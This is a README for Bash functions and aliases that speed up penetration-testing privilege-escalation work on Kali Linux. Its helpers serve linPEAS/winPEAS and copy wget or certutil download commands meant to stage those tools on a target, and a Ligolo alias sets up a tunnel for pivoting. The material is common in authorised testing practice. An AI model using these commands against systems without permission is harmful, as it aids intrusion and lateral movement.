# Kali Linux Productivity Functions & Aliases for Privilege Escalation

This repository contains custom Bash functions and aliases that streamline privilege escalation workflows on Kali Linux. These shortcuts are tailored for common Linux and Windows enumeration tasks, file hosting, and working with tunneling tools like Ligolo.

---

## ⚙️ Installation & Requirements

To ensure all functions and aliases work correctly, make sure the following tools are installed:

### ✅ Required Tools

| Tool         | Description                                                  | Install Command                                     |
|--------------|--------------------------------------------------------------|-----------------------------------------------------|
| `xsel`       | Copies commands to the system clipboard                      | `sudo apt install xsel -y`                          |
| `ligolo-ng`  | Tunneling tool for pivoting and internal access              | [Install from official repo](https://github.com/Nicocha30/ligolo-ng) or build manually |
| `python3`    | Required for the HTTP server                                 | Pre-installed on most Kali setups                   |

### 📂 Directory Setup

Ensure you have the following folder structure to serve your PEAS tools:

```bash
mkdir -p ~/Desktop/privesc/linux
mkdir -p ~/Desktop/privesc/windows
```

Place any Linux or Windows privilege escalation scripts withing the respective folders that were created,

---

## 📜 Functions Explained

### `lpe`
> **Purpose:** Quickly host `linpeas.sh` and copy a ready-to-use `wget` command to your clipboard.

- Extracts your IP address from the `tun0` interface.
- Generates a `wget` command pointing to your hosted `linpeas.sh` script.
- Copies the command to your clipboard using `xsel`.
- Serves files from your Linux privilege escalation directory via Python's built-in HTTP server.

---

### `wpe`
> **Purpose:** Host `winpeas.exe` and copy a ready-to-use `certutil` command to your clipboard.

- Retrieves your `tun0` IP address.
- Generates a `certutil` command to download `winpeas.exe` on a Windows target.
- Copies the command to your clipboard.
- Starts an HTTP server from the Windows privilege escalation folder.

---

### `ligolo_add_route`
> **Purpose:** Add a new route through the `ligolo` TUN interface.

- Validates that a subnet (e.g., `10.10.10.0/24`) is provided.
- Adds the route via the `ligolo` interface using `ip route add`.

---

## 🔗 Aliases Explained

- `ll` → `ls -l`: Long listing format.
- `la` → `ls -A`: List all entries except `.` and `..`.
- `l` → `ls -CF`: Classify entries and display in columns.
- `www` → Starts a quick HTTP server in the current directory.
- `clip` → Copy input to clipboard using `xsel`.
- `ligolo` → Sets up the Ligolo tunneling interface and starts the proxy binary.

---

## 💻 Full Function & Alias Definitions

**Place these into your `~/.zshrc` (or `~/.bashrc` if you're on an older Kali Linux version).**

Once placed, save the file and don't forget to `source ~/.zshrc` if you're in the same terminal instance.

```bash
function lpe(){
    get_ip=`ip a show tun0 | grep "inet " | awk '{print $2}' | rev | cut -c 4- | rev`
    echo -n "wget http://${get_ip}:8000/linpeas.sh" | xsel --input --clipboard --trim
    ls /home/kali/Desktop/privesc/linux && python3 -m http.server --directory /home/kali/Desktop/privesc/linux
}

function wpe(){
    get_ip=`ip a show tun0 | grep "inet " | awk '{print $2}' | rev | cut -c 4- | rev`
    echo -n "certutil -urlcache -f \"http://$get_ip:8000/winpeas.exe\" winpeas.exe" | xsel --input --clipboard --trim 
    ls /home/kali/Desktop/privesc/windows && python3 -m http.server --directory /home/kali/Desktop/privesc/windows
}

function ligolo_add_route(){
    if [ "$#" -ne 1 ]; then
        echo "Usage: ligolo_add_route <subnet>"
        exit 1
    fi
    sudo ip route add $1 dev ligolo
}

alias ll='ls -l'
alias la='ls -A'
alias l='ls -CF'
alias www='python3 -m http.server'
alias clip='xsel --input --clipboard --trim'
alias ligolo='sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up && echo "[*] Add a Route using: ligolo_add_route <subnet>" && /home/kali/Desktop/privesc/linux/proxy -selfcert'
```

---

## 🧠 Notes

- Ensure `xsel` is installed for clipboard functionality.
- Replace file paths with your actual directories if different.
- Requires root privileges for networking commands like `ip route add`.

---

If you have other aliases that should be used, let us know and we will add them, with credits, of course!
